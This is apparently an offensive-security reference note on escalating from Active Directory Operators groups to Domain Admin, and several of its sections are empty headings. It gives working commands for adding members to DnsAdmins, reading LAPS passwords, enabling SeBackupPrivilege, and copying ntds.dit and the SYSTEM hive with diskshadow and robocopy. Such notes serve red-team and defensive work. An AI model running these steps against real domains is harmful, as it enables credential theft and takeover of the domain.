# Active Directory - Operators to Domain Admins

### Overview

The built-in `Operators` groups are granted, by default, special privileges on
the Domain Controllers, through the `Default Domain Controller Policy`
`Group Policy Object (GPO)` (`UID: {6AC1786C-016F-11D2-945F-00C04fB984F9}`)
linked on the Domain Controllers `Organisational Unit (OU)`.

The following `security identifier (SID)` are associated to privileged built-in
groups:

| SID | Name |
|-----|------|
| `S-1-5-32-544` | `Administrators` |
| `S-1-5-32-548` | `Account Operators` |
| `S-1-5-32-549` | `Server Operators` |
| `S-1-5-32-550` | `Print Operators` |
| `S-1-5-32-551` | `Backup Operators` |

```
# Default Domain Controller Policy

SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544

[...]
```

### Administrators

The built-in `Administrators` / `Administrateurs` `domain local` group (`SID:
S-1-5-32-544`) correspond to the original local `Administrators` group of
servers being promoted to the Domain Controllers role. The domain
`Administrators` group, and its members, are protected by the `AdminSDHolder`
mechanism.

The members of the domain `Administrators` group:

  - Have full control over all the Domain Controllers of the domain. Among
    others possibilities, this access can be leveraged to remotely connect to a
    Domain Controller and dump the Active Directory `ntds.dit` database. Refer
    to the `[ActiveDirectory] ntds.dit dumping` for note for techniques to do
    so.

  - Can by default take ownership (`WriteOwner`) and modify the `DACL`
    (`WriteDacl`) and properties (`WriteProperty` on `00000000-[...]00`) of
    most Active Directory objects. Including the privileged principals (`Domain
    Admins`, `Enterprise Admins`, etc.) protected by the `AdminSDHolder`
    mechanism. Those rights can be leveraged to add member(s) to the privileged
    domain groups or change the password of privileged users. Refer to the
    `[ActiveDirectory] ACL exploiting - Users and groups permissions
    exploitation` note more information on how to conduct this kind of attacks.

```
# Validates the presence of the default ACL relative to the domain Administrators group on the AdminSDHolder object.
# DOMAIN_ROOT_OBJECT = "DC=LAB,DC=AD" for example

Get-Acl "AD:\CN=AdminSDHolder,CN=System,<DOMAIN_ROOT_OBJECT>" | Select-Object -ExpandProperty Access | ? IdentityReference -match "Administrators"

  ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl,WriteOwner
  InheritanceType       : None
  ObjectType            : 00000000-0000-0000-0000-000000000000
  InheritedObjectType   : 00000000-0000-0000-0000-000000000000
  ObjectFlags           : None
  AccessControlType     : Allow
  IdentityReference     : BUILTIN\Administrators
  IsInherited           : False
  InheritanceFlags      : None
  PropagationFlags      : None
```

### Account Operators

The members of the `Account Operators` / `Opérateurs de compte` `domain local`
group (`SID: S-1-5-32-548`) have full control over user and machine accounts
and domain groups, except for the accounts and groups that are protected by
the `AdminSDHolder` mechanism. The domain `Account Operators` group, and its
members, are protected by the `AdminSDHolder` mechanism.

Membership to the domain `Account Operators` group can be leveraged to:

  - Add member(s) to the `DnsAdmins` group, which is not protected by the
    `AdminSDHolder` mechanism, to remotely execute code as
    `NT AUTHORITY\SYSTEM` on a Domain Controller.  

    ```
    # Validates the presence of the default ACL relative to the Account Operators group on the DnsAdmins group.
    # DOMAIN_ROOT_OBJECT = "DC=LAB,DC=AD" for example
    Get-Acl "AD:\CN=DnsAdmins,CN=Users,<DOMAIN_ROOT_OBJECT>" | Select-Object -ExpandProperty Access | ? IdentityReference -match "Account Operators"

      ActiveDirectoryRights : GenericAll
      InheritanceType       : None
      ObjectType            : 00000000-0000-0000-0000-000000000000
      InheritedObjectType   : 00000000-0000-0000-0000-000000000000
      ObjectFlags           : None
      AccessControlType     : Allow
      IdentityReference     : BUILTIN\Account Operators
      IsInherited           : False
      InheritanceFlags      : None
      PropagationFlags      : None

    net localgroup "DnsAdmins" "<DOMAIN>\<USERNAME>" /add /domain
    dsmod.exe group "CN=DnsAdmins,CN=Users,<DOMAIN_ROOT_OBJECT>" -addmbr "<USER_DISTINGUISHED_NAME"

    Add-ADGroupMember -Identity "DnsAdmins" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
    Add-ADGroupMember -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials> -Identity "DnsAdmins" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
    ```

  - Take control of non-protected machines where privileged users have opened a
    session. `PowerView`'s cmdlets and `SharpHound` both wrap around the
    Windows `Win32API`'s `NetSessionEnum` API and can be used to enumerate
    sessions on remote systems. Refer to the `[ActiveDirectory] Credentials
    theft shuffling - Session hunting` and `[ActiveDirectory] AD scanners`
    notes for more information.

    Multiples techniques may be leveraged to take control of the non protected
    machines, including:

    - Reading the `Local Administrator Password Solution (LAPS)` password of
    the non-protected machines if the solution is deployed on the domain, as
    the `Account Operators` group can by default read all attributes of
    the machine accounts (including the `ms-Mcs-AdmPwd` attribute).

      ```
      Get-ADComputer -Identity <SamAccountName | DistinguishedName | SID | GUID> -Properties * | Ft Name,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd
      Get-ADComputer -Filter {ms-mcs-admpwdexpirationtime -like "*"} -Properties * | Ft Name,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd
      ```

    - Add member(s) to non-protected domain group, or change password of
    non-protected domain users, that are members of the local `Administrators`
    group of the targeted machine. `PowerView`'s cmdlets, `PingCastle`'s
    `localadmin` scanner and `SharpHound`'s `LocalAdmin` collection method can
    all be used to enumerate local groups memberships through `RPC` calls to
    the `SAMR` interface of the remote system (either through direct `RPC`
    calls or through the `NetLocalGroupGetMembers` Windows API). Refer to the
    `[ActiveDirectory] Credentials theft shuffling - Local group enumeration`
    for more information.

### Backup Operators

The members of the `Backup Operators` / `Opérateurs de sauvegarde` `domain
local` group (`SID: S-1-5-32-551`) can remotely connect to Domain Controllers
and `backup` or `restore` any files due to being granted the
`SeBackupPrivilege` and `SeRestorePrivilege` privileges. These privileges can
be leveraged to retrieve the content of the Active Directory `ntds.dit`
database (which contain the Active Directory data such as usernames and
users' `NTLM` hashes and `Kerberos` secrets). The domain `Backup Operators`
group, and its members, are protected by the `AdminSDHolder` mechanism.

The `SeBackupPrivilege` privilege allows for the retrieval of any file content
while the `SeRestorePrivilege` grants the possibility to modify any file, even
if the security descriptor on the file might not grant such access. The members
of the `Backup Operators` domain group cannot directly copy the `ntds.dit` file
as the `Access Control List (ACL)` on the file restrict access to the
`NT AUTHORITY\SYSTEM` built-in Windows Account and the `Administrators` domain
group. In order to bypass the `ACL`, the `SeBackupPrivilege` privilege must be
leveraged by opening the `ntds.dit` file with the `FILE_FLAG_BACKUP_SEMANTICS`
flag, which can be done using the Windows built-in utility `robocopy`.

If the `SeBackupPrivilege` is not present, or `Enabled`, in the `Access Tokens`
of the command interpreter process, which may be the case in interactive logon
session if the `User Account Control (UAC)` mechanism is configured on the
Domain Controller, it must be enabled in order to be able to make use of the
`FILE_FLAG_BACKUP_SEMANTICS` flag.

If a `PowerShell Remoting (WinRM)` service (`TCP` ports `5985` and/or `5986`)
is exposed on a Domain Controller, and the compromised account is also a member
of the `Remote Management Users` domain group, the backup of the `ntds.dit`
file should preferably be done through `PowerShell Remoting`. Indeed, non
interactive session are not subject to the `UAC` mechanism and the
`SeBackupPrivilege` (and `SeRestorePrivilege`) privilege will thus be enabled
on the remote PowerShell process. For more information on how to connect
through `WinRM`, refer to the `[L7] 5985-5986 WSMan` and `[Windows] Lateral
movements` notes.

Otherwise, if access to a Domain Controller through `PowerShell Remoting` is
not a possibility, a PowerShell process must be started in an elevated security
context and the `SeBackupPrivilege` token manually enabled.

```
# Lists the privileges, and their status, present in the current process Access Tokens
# If SeBackupPrivilege appears as "Disabled" ("SeBackupPrivilege  Back up files and directories  Disabled"), the process runs in a elevated security context but SeBackupPrivilege must be enabled
whoami /priv

# Starts PowerShell in an elevated context
Start-Process -Verb RunAs powershell.exe

# Uses PowerSploit's Enable-Privilege PowerShell cmdlet to enable SeBackupPrivilege in the current process Access Tokens
Import-Module .\PowerUp.ps1
Enable-Privilege -Privilege SeBackupPrivilege
```

Then, in an elevated process with the `SeBackupPrivilege` privilege enabled,
`robocopy` can be used to copy in backup mode the `ntds.dit` file. The
sensitive information in the `ntds.dit` file is encrypted using the system
`Boot Key` (also known as the `System Key`, or `SysKey`) which is located in
the `HKEY_LOCAL_MACHINE\SYSTEM` registry hive. The `HKLM\SYSTEM` must thus also
be exported. For more tools and techniques to create a shadow volume, refer to
the `[ActiveDirectory] ntds.dit dumping` note.

```
reg save HKLM\SYSTEM <EXPORT_PATH>\SYSTEM

diskshadow.exe
  set context persistent nowriters
  add volume c: alias <ALIAS>
  create
  expose %<ALIAS>% <DRIVE_LETTER>:

robocopy /b "<DRIVE_LETTER>:\Windows\NTDS" "<EXPORT_FOLDER>" ntds.dit

diskshadow.exe
  delete shadows volume %<ALIAS>%
  reset
```

### DNS Admins

### Print Operators

### Schema Admins

### Server Operators

The members of the `Server Operators` / `Opérateurs de serveur` `domain
local` group (`SID: S-1-5-32-549`) can, similarly to `Backup operators`,
remotely connect to Domain Controllers and `backup` or `restore` any files.
Indeed, granted the `Server Operators` are also granted the `SeBackupPrivilege`
and `SeRestorePrivilege` privileges

Refer to the `Backup Operators` section for techniques on how to leverage a
membership to the `Server Operators` group to elevate privileges to `Domain
Administrators`.
